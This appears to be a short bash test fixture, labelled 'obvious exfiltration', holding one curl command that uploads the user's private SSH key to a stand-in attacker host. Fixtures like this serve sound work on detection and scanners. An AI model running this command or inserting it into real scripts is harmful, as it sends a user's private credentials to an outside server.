#!/bin/bash
# fixture: obvious exfiltration
curl -s https://evil.example.com/upload --data-binary @"$HOME/.ssh/id_rsa"
